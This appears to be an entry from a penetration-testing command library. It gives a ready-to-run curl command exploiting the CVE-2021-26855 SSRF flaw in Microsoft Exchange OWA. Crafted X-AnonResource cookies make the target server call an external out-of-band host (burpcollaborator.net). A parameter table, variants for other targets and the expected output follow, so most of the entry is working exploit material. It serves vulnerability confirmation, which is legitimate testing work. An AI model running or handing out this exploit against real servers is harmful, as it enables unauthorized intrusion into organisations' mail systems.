---
id: cmd-uuid-1234
data: >-
  curl -i -s -k -X $'GET' -H $'Host: target-exchange.com' -H $'User-Agent:
  Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101
  Firefox/86.0' -H $'Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H
  $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H
  $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -b
  $'X-AnonResource=true;
  X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3;
  X-BEResource=localhost/owa/auth/logon.aspx?~3'
  $'https://target-exchange.com/owa/auth/x.js'
tags:
  - ssrf
  - http-request
  - curl
type: command
output: >-
  HTTP/1.1 200 OK\r\n... (redacted JavaScript response indicating successful
  request processing)
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.711Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-exchange-owa

## Command

```bash
curl -i -s -k -X $'GET' -H $'Host: target-exchange.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' $'https://target-exchange.com/owa/auth/x.js'
```

## Description

This command uses curl to send a crafted HTTP GET request to exploit SSRF in Microsoft Exchange OWA via CVE-2021-26855. It sets browser-like headers and malicious cookies to force the server to request an external domain, useful for vulnerability confirmation in penetration testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers in output | Yes |
| `-s` | Silent mode (no progress or errors) | Yes |
| `-k` | Skip SSL certificate verification | Yes |
| `-X GET` | Specify GET method | Yes |
| `-H 'Host: ...'` | Set Host header to target domain | Yes |
| `-H 'User-Agent: ...'` | Mimic browser User-Agent | Yes |
| `-H 'Accept: ...'` | Set Accept header for HTML | Yes |
| `-H 'Accept-Language: ...'` | Set language preference | Yes |
| `-H 'Accept-Encoding: ...'` | Set encoding | Yes |
| `-H 'Connection: close'` | Close connection after request | Yes |
| `-H 'Upgrade-Insecure-Requests: 1'` | Indicate upgrade preference | Yes |
| `-b '...' ` | Set cookies for SSRF payload | Yes |
| URL | Target OWA endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X GET -H 'Host: target.com' ... (full command as above)
```

### Advanced Usage

Adapt the Host and URL for different targets; replace burpcollaborator.net with your OOB domain.

```bash
curl -i -s -k -X $'GET' -H $'Host: alt-target.com' ... -b $'X-AnonResource=true; X-AnonResource-Backend=yourdomain.com/test?~3; ...' $'https://alt-target.com/owa/auth/x.js'
```

## Expected Output

A 200 OK response with JavaScript content from /owa/auth/x.js, plus headers. SSRF success is indirect: check OOB tool for callbacks from the server.

## Related

- [[Related Procedure: Trigger-SSRF-in-Exchange-OWA]]
